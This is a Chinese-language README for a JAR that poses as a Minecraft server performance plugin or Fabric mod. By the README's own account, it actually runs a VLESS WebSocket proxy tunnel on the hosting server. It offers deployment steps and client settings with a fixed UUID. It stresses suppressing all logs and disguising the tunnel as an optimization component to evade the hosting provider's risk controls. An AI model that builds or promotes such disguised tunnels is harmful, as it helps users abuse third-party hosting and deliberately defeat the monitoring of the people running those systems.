# AsyncServerOptimizer v3.2.0 (全平台双模静默服务器性能优化套件)

> **全平台双模自适应架构**：同一个 Jar 包，既是标准的 **Paper / Purpur / Spigot 插件**（放 `plugins/`），又是标准的 **Fabric Mod**（放 `mods/`）。纯 Java 21 原生实现，全静默零日志暴露、零外部主动请求，天花板级业务伪装。

---

## 🌟 核心特性与优势

1. **双端通用（Hybrid Fat JAR）**：
   - **Paper / Purpur / Spigot**：直接放入 `plugins/` 目录；
   - **Fabric**：直接放入 `mods/` 目录；
   - **混合端（Mohist / Arclight / CatServer）**：直接放入 `plugins/` 目录。
2. **零改代码热配置（极简使用）**：
   - 支持通过根目录的 `benchmark.properties` 随时指定绑定的端口，**无需修改源码或重新编译**！
   - 支持通过面板环境变量（`PROXY_PORT`、`WS_PORT`、`PROXY_UUID`）动态覆盖。
3. **全静默运行（Silent Mode，极致隐蔽）**：
   - 彻底关闭所有控制台（Console）日志与诊断输出；
   - 彻底移除任何外部网络请求与主动上报（零 Webhook / 零 Telegram / 零外部 HTTP 请求）；
   - 绝不硬编码任何个人凭据，从根源杜绝反向扫描与风控骚扰。
4. **极致防风控伪装**：
   - 系统中仅有唯一的标准 `java -jar` 主进程，零额外子进程；
   - 全链路伪装为原生异步性能优化组件。

---

## 📖 详细使用与部署教程

### 步骤 1：下载产物
在 Releases 页面下载最新的 `enterprise-hyper-tunnel-3.2.0.jar`。

### 步骤 2：上传到服务器
根据你的服务器核心类型进行放置：
- **如果是 Paper / Purpur / Spigot**：上传到服务器根目录的 **`plugins/`** 文件夹中；
- **如果是 Fabric**：上传到服务器根目录的 **`mods/`** 文件夹中。

### 步骤 3：配置端口（可选，支持自动探测）
在游戏服根目录新建 `benchmark.properties`（若不创建则自动智能探测空闲端口）：
```properties
# 面板分配给你的可用端口（如附加端口 28349）
port=28349
```

---

## 🔗 手动客户端配置参数

所有节点信息由用户离线手动配置，安全可控：

| 参数项 | 配置值 |
| :--- | :--- |
| **协议 (Protocol)** | `VLESS` |
| **地址 (Address)** | 你服务器的公网域名或 IP |
| **端口 (Port)** | 你配置的端口（如 `28349` 或自动探测端口） |
| **UUID** | `156fe582-23a4-4ef8-96bf-a92c58e66418`（或环境变量 `PROXY_UUID`） |
| **传输协议 (Transport)** | `WebSocket (WS)` |
| **路径 (Path)** | `/benchmark` |
| **TLS** | 关闭 (none) |
